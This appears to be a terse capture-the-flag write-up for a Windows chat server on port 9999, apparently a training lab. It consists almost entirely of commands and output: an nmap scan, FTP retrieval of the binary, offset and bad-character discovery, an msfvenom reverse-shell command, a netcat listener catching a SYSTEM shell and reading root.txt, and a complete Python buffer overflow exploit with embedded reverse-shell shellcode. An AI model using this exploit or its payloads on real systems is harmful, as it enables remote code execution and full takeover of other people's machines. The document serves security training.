## nmap -sVC -A 10.10.163.29
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 12:05 EET
Nmap scan report for 10.10.163.29
Host is up (0.0044s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-03-16T10:12:18+00:00; 0s from scanner time.
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=3/16%Time=6231B732%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X|3.X, Microsoft Windows XP|7|2012
OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:linux:linux_kernel:3.2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
OS details: DD-WRT v24-sp2 (Linux 2.4.37), Linux 3.2, Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.13 ms 192.168.137.2
2   0.14 ms 10.10.163.29

OS and Service detection performed. Please report any inc
``` 
## ftp 10.10.163.29
```
ftp> dir
200 PORT command successful.
08-29-19  08:36PM       <DIR>          chatserver
ftp> cd chatserver
d250 CWD command successful.
ftp> dir
200 PORT command successful.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 PORT command successful.
226 Transfer complete.
43747 bytes received in 6.46 secs (6.6104 kB/s)
ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 PORT command successful.
```
# Buffer Overflow
## Fuzz with Immunity debugger 
```
crashed with 2200 bytes
```
## pattern_create.rb -l 2200
```
EIP = 31704330
```
## pattern_offset.rb -q 31704330
```
[*] Exact match at offset 2012
```
## Finding Bad Characters 
###!mona bytearray -b "\x00"
###!mona compare -f "C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a 016DEEC0
```
Log data, item 4
 Address=016DEEC0
 Message=[+] Comparing with memory at location : 0x016deec0 (Stack)
Log data, item 3
 Address=016DEEC0
 Message=!!! Hooray, normal shellcode unmodified !!!
```
## Jump Address
### !mona modules
```
Log data, item 17
 Address=0BADF00D
 Message= 0x62500000 | 0x6250b000 | 0x0000b000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\User\Desktop\essfunc.dll)

```
### !mona jmp -r esp -m "essfunc.dll"
```
Log data, item 11
 Address=625014DF
 Message=  0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\Desktop\essfunc.dll)
```

## Payload
### msfvenom -p windows/shell_reverse_tcp LHOST=10.2.92.176  LPORT=5555 -e x86/shikata_ga_nai -f py -v shell -b "\x00"

## Exploit
```
root@kali:~# nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.2.92.176] from (UNKNOWN) [10.10.163.29] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ..
cd ..

C:\Windows> ..
cd ..

C:\>cd users
cd users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users

08/29/2019  10:20 PM    <DIR>          .
08/29/2019  10:20 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          drake
11/21/2010  12:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,659,075,584 bytes free

C:\Users>cd drake
cd drake

C:\Users\drake>cd Desktop
cd Desktop

C:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,658,911,744 bytes free

C:\Users\drake\Desktop>type root.txt
type root.txt
5b1001de5a44eca47eee71e7942a8f8a
```



#Exploit Code
```
import socket
import sys
import os

#ip="127.0.0.1"
ip = "10.10.163.29"

port = 9999
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"

badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shell =  b""
shell += b"\xbb\xb0\x97\x15\xd9\xd9\xcb\xd9\x74\x24\xf4\x5a"
shell += b"\x29\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04\x03\xea"
shell += b"\x99\xf7\x2c\xf6\x4e\x75\xce\x06\x8f\x1a\x46\xe3"
shell += b"\xbe\x1a\x3c\x60\x90\xaa\x36\x24\x1d\x40\x1a\xdc"
shell += b"\x96\x24\xb3\xd3\x1f\x82\xe5\xda\xa0\xbf\xd6\x7d"
shell += b"\x23\xc2\x0a\x5d\x1a\x0d\x5f\x9c\x5b\x70\x92\xcc"
shell += b"\x34\xfe\x01\xe0\x31\x4a\x9a\x8b\x0a\x5a\x9a\x68"
shell += b"\xda\x5d\x8b\x3f\x50\x04\x0b\xbe\xb5\x3c\x02\xd8"
shell += b"\xda\x79\xdc\x53\x28\xf5\xdf\xb5\x60\xf6\x4c\xf8"
shell += b"\x4c\x05\x8c\x3d\x6a\xf6\xfb\x37\x88\x8b\xfb\x8c"
shell += b"\xf2\x57\x89\x16\x54\x13\x29\xf2\x64\xf0\xac\x71"
shell += b"\x6a\xbd\xbb\xdd\x6f\x40\x6f\x56\x8b\xc9\x8e\xb8"
shell += b"\x1d\x89\xb4\x1c\x45\x49\xd4\x05\x23\x3c\xe9\x55"
shell += b"\x8c\xe1\x4f\x1e\x21\xf5\xfd\x7d\x2e\x3a\xcc\x7d"
shell += b"\xae\x54\x47\x0e\x9c\xfb\xf3\x98\xac\x74\xda\x5f"
shell += b"\xd2\xae\x9a\xcf\x2d\x51\xdb\xc6\xe9\x05\x8b\x70"
shell += b"\xdb\x25\x40\x80\xe4\xf3\xc7\xd0\x4a\xac\xa7\x80"
shell += b"\x2a\x1c\x40\xca\xa4\x43\x70\xf5\x6e\xec\x1b\x0c"
shell += b"\xf9\x19\xde\x52\x49\x75\xdc\x6a\xbc\x35\x69\x8c"
shell += b"\xd4\x29\x3c\x07\x41\xd3\x65\xd3\xf0\x1c\xb0\x9e"
shell += b"\x33\x96\x37\x5f\xfd\x5f\x3d\x73\x6a\x90\x08\x29"
shell += b"\x3d\xaf\xa6\x45\xa1\x22\x2d\x95\xac\x5e\xfa\xc2"
shell += b"\xf9\x91\xf3\x86\x17\x8b\xad\xb4\xe5\x4d\x95\x7c"
shell += b"\x32\xae\x18\x7d\xb7\x8a\x3e\x6d\x01\x12\x7b\xd9"
shell += b"\xdd\x45\xd5\xb7\x9b\x3f\x97\x61\x72\x93\x71\xe5"
shell += b"\x03\xdf\x41\x73\x0c\x0a\x34\x9b\xbd\xe3\x01\xa4"
shell += b"\x72\x64\x86\xdd\x6e\x14\x69\x34\x2b\x24\x20\x14"
shell += b"\x1a\xad\xed\xcd\x1e\xb0\x0d\x38\x5c\xcd\x8d\xc8"
shell += b"\x1d\x2a\x8d\xb9\x18\x76\x09\x52\x51\xe7\xfc\x54"
shell += b"\xc6\x08\xd5"



#625014df
n=0
while True:
 try:
   print ("Sending ",n,"Bytes")
   
   #payload="A"*n 
   #payload= pattern
   #payload="A"*(6108)+"BBBB"+"C"*(6300-6108-4)
   #payload="A"*(6108)+"BBBB" + badChars+ "C"*(6300-6108-4-len(badChars))

   payload="A"*(2012)+"\xdf\x14\x50\x62" +"\x90"*16 +shell + "\x90"*(2200-2012-4-16-len(shell))


   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
   
   s.send("aaaa")
   print (s.recv(1024))

   s.send(payload)
   print (s.recv(1024))


   s.close()
   #break
   n+=100
   
 except Exception as e:
           print (e)
           print("crashed at, ",n)
           break

```



